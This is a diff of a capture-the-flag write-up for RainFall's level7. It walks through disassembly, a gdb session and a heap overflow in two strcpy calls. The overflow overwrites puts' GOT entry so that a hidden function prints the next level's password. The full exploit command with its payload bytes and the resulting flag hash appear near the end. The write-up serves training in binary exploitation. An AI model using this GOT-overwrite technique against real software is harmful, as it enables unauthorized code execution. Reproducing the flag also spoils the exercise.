@@ -1,48 +1,138 @@
-In this exercise, we have a sequence of 4 malloc then 2 strcpy.
-Examine it well and after some test, we understand that it is two structures.
-And that in each structure we have a string, in which have copy argv 1 and 2.
-And for finish we have a fopen with this path "/home/user/level8/.pass" follow by a fgets
-in "c" variable. And a puts , but don't print c variable.
+(gdb) b * main + 178
+Breakpoint 1 at 0x80485d3
+(gdb) r 1 2 3
+Starting program: /home/user/level7/level7 1 2 3
 
-With objdump we find an other function, "m" with printf of c variable.
+Breakpoint 1, 0x080485d3 in main ()
+(gdb) x/s $eax
+0x80486eb:	 "/home/user/level8/.pass"
+(gdb) i r
+eax            0x80486eb	134514411
+ecx            0xbffff830	-1073743824
+edx            0x80486e9	134514409
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff600	0xbffff600
+ebp            0xbffff628	0xbffff628
+esi            0x0	0
+edi            0x0	0
+eip            0x80485d3	0x80485d3 <main+178>
+eflags         0x200246	[ PF ZF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/s 0x80486e9
+0x80486e9:	 "r"
 
-In summary we need to find a way to exploit the heap, with the arguments for call m function.
 
-Let's look at how structures are allocated.
+(gdb) disas main 
+Dump of assembler code for function main:
+   0x08048521 <+0>:	push   %ebp
+   0x08048522 <+1>:	mov    %esp,%ebp
+   0x08048524 <+3>:	and    $0xfffffff0,%esp
+   0x08048527 <+6>:	sub    $0x20,%esp
+   0x0804852a <+9>:	movl   $0x8,(%esp)
+   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
+   0x0804853a <+25>:	mov    0x1c(%esp),%eax
+   0x0804853e <+29>:	movl   $0x1,(%eax)
+   0x08048544 <+35>:	movl   $0x8,(%esp)
+   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+   0x08048550 <+47>:	mov    %eax,%edx
+   0x08048552 <+49>:	mov    0x1c(%esp),%eax
+   0x08048556 <+53>:	mov    %edx,0x4(%eax)
+   0x08048559 <+56>:	movl   $0x8,(%esp)
+   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+   0x08048565 <+68>:	mov    %eax,0x18(%esp)
+   0x08048569 <+72>:	mov    0x18(%esp),%eax
+   0x0804856d <+76>:	movl   $0x2,(%eax)
+   0x08048573 <+82>:	movl   $0x8,(%esp)
+   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+   0x0804857f <+94>:	mov    %eax,%edx
+   0x08048581 <+96>:	mov    0x18(%esp),%eax
+   0x08048585 <+100>:	mov    %edx,0x4(%eax)
+   0x08048588 <+103>:	mov    0xc(%ebp),%eax
+   0x0804858b <+106>:	add    $0x4,%eax
+   0x0804858e <+109>:	mov    (%eax),%eax
+   0x08048590 <+111>:	mov    %eax,%edx
+   0x08048592 <+113>:	mov    0x1c(%esp),%eax
+   0x08048596 <+117>:	mov    0x4(%eax),%eax
+   0x08048599 <+120>:	mov    %edx,0x4(%esp)
+   0x0804859d <+124>:	mov    %eax,(%esp)
+   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
+   0x080485a8 <+135>:	add    $0x8,%eax
+   0x080485ab <+138>:	mov    (%eax),%eax
+   0x080485ad <+140>:	mov    %eax,%edx
+   0x080485af <+142>:	mov    0x18(%esp),%eax
+   0x080485b3 <+146>:	mov    0x4(%eax),%eax
+   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
+   0x080485ba <+153>:	mov    %eax,(%esp)
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+   0x080485c2 <+161>:	mov    $0x80486e9,%edx
+   0x080485c7 <+166>:	mov    $0x80486eb,%eax
+   0x080485cc <+171>:	mov    %edx,0x4(%esp)
+   0x080485d0 <+175>:	mov    %eax,(%esp)
+   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
+   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
+   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+   0x080485fc <+219>:	mov    $0x0,%eax
+   0x08048601 <+224>:	leave  
+   0x08048602 <+225>:	ret    
+End of assembler dump.
 
- -----------------------------------------------------------------------------------------------------------
- | s1 ( Name, Char Pointer ) | Paddings and Other Stuff | s2 ( Name, Char Pointer ) |  Name (8) |  Name (8) |
- ------------------------------------------------------------------------------------------------------------
 
-With the first strcpy, we need to overwrite char pointer of s2 with GOT table adress.
-Like that with the second strcpy, we will not copy on the string of s2 but on the GOT table (puts function),
-and give a function m adress.
+objdump -t ./level7  | grep ".text"
+08048440 l    d  .text	00000000              .text
+08048470 l     F .text	00000000              __do_global_dtors_aux
+080484d0 l     F .text	00000000              frame_dummy
+08048690 l     F .text	00000000              __do_global_ctors_aux
+08048680 g     F .text	00000002              __libc_csu_fini
+08048682 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
+08048610 g     F .text	00000061              __libc_csu_init
+08048440 g     F .text	00000000              _start
+080484f4 g     F .text	0000002d              m
+08048521 g     F .text	000000e2              main
 
-So we need adress of m = 
-(gdb) p &m
-$1 = (<text variable, no debug info> *) 0x80484f4 <m> = \xf4\x84\x04\x08
 
-And adress of puts = 
-(gdb) p &puts
-$2 = (<text variable, no debug info> *) 0x8048400 <puts@plt>
-(gdb) disass 0x8048400
+The exploit comes from the strcpy, it's a buffer overflow.
+strcpy isn't protected and doesn't check for the size of its argument.
+To pass the first strcpy we know that the buffer can contain only 20 bytes, we
+can confirm that by sending 21 bytes and getting a segfault :
+
+./level7 $(python -c 'print "A" * 21') "BBBB"
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20') "BBBB"
+
+
+With the first argument we go to the puts'GOT address.
+As RELRO isn't activated we can write on the GOT.
+2nd strcpy write to the pointer of strcpy (1) the address of the m function, 
+the one we want to execute.
+Then, we executing the level7 puts call will look for its "read" address on
+the PLT table which is in factt m's address which will be executed next.
+This allow us to get the flag.
+
+gdb) disas 0x8048400
 Dump of assembler code for function puts@plt:
    0x08048400 <+0>:	jmp    *0x8049928
    0x08048406 <+6>:	push   $0x28
    0x0804840b <+11>:	jmp    0x80483a0
 End of assembler dump.
+(gdb) disas 0x8049928
+Dump of assembler code for function puts@got.plt:
+   0x08049928 <+0>:	push   %es
+   0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
+End of assembler dump.
 
-0x8049928 = \x28\x99\x04\x08
 
-We need to find the limit for overflow de second structure so we send a long string
-like this: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-
-And with dmesg we have the info for the segfault: 
-[ 9396.506192] level7[3120]: segfault at 37614136 ip b7eb8f52 sp bffff6bc error 6 in libc-2.15.so[b7e2c000+1a3000]
-
-37614136 = 36 41 61 37 =  6 A a 7 = So the 20th character.
-
-level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')
+$(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1643286266
-
+ - 1642785922
